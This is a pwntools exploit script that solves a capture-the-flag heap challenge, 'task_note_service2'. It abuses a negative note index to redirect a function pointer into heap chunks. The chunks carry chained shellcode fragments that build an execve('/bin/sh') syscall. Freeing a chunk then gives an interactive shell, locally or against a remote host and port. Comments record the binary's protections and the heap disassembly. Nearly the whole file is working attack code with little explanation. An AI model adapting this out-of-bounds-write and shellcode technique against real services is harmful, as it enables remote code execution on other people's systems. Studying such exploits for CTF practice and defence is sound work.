# coding:utf-8
from pwn import *
debug=1
#context.log_level='debug'
elf = ELF('./task_note_service2_OG37AWm')
#libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
if debug:
    p = process('./task_note_service2_OG37AWm')#,env={'LD_PRELOAD':'/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so'})
#    gdb.attach(p)
else:
    p = remote('49.4.23.164', 32321)#  49.4.23.164 32321
#    libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
#    one_gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def add(index,size,content):
	p.recvuntil('your choice>> ')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(index))
	p.recvuntil('size:')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.sendline(content)

def free(index):
	p.recvuntil('your choice>> ')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(index))

# code="""
#     mov rax,0x3b
#     xor rsi,rsi
#     xor rdx,rdx
#     call get_shell
#     .ascii "/bin/sh"
#     .byte 0
# get_shell:
#     pop rdi
#     syscall
# """
code = """
	push rbp
	pop rax
	;push rdx
	;pop rsi
"""
#[heap]:000055BF95A36028 and     [rax], eax
add(-17,8,asm(code,arch="amd64"))

code = """
	;xor rbx,rbx
	push rbp
	pop rcx
	;push rbx
	;pop rdx
"""
#[heap]:000055BF95A36047 add     [rcx], ah
add(0,8,asm(code,arch="amd64"))

code = """
	;push rbx
	;pop rsi
	xor rsi,rsi
	xor rdx,rdx
"""
#[heap]:000055BF95A36067 add     [rcx], ah
add(1,8,'\x90'+asm(code,arch="amd64"))

code = """
	xor rax,rax
	movzx rax,0x3b
	syscall
"""

add(2,8,'\x90'+asm(code,arch="amd64"))

add(5,8,'/bin/sh\x00')

#pause()
free(5)
p.interactive()


#print len(asm(code,arch="amd64"))
#conn.send(asm(code,arch="amd64"))
#p.interactive()
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX disabled
    # PIE:      PIE enabled
    # RWX:      Has RWX segments

# [heap]:000055BF95A36010 push    rbp
# [heap]:000055BF95A36011 pop     rax
# [heap]:000055BF95A36012 push    rdx -
# [heap]:000055BF95A36013 pop     rsi -


# [heap]:000055BF95A36028 and     [rax], eax

# [heap]:000055BF95A36030 xor     rbx, rbx -
# [heap]:000055BF95A36033 push    rbp
# [heap]:000055BF95A36034 pop     rcx
# [heap]:000055BF95A36035 push    rbx -
# [heap]:000055BF95A36036 pop     rdx -

# [heap]:000055BF95A36047 add     [rcx], ah

# [heap]:000055BF95A36051 push    rbx -
# [heap]:000055BF95A36052 pop     rsi -
# [heap]:000055BF95A36053 xor     rbx, 3Bh

# [heap]:000055BF95A36067 add     [rcx], ah

# [heap]:000055BF95A36071 push    rbx
# [heap]:000055BF95A36072 pop     rax
# [heap]:000055BF95A36073 syscall                                 ; LINUX - sys_read

#rdi 000055BF95A36090  2F 62 69 6E 2F 73 68 00  00 00 00 00 00 00 00 00  /bin/sh.........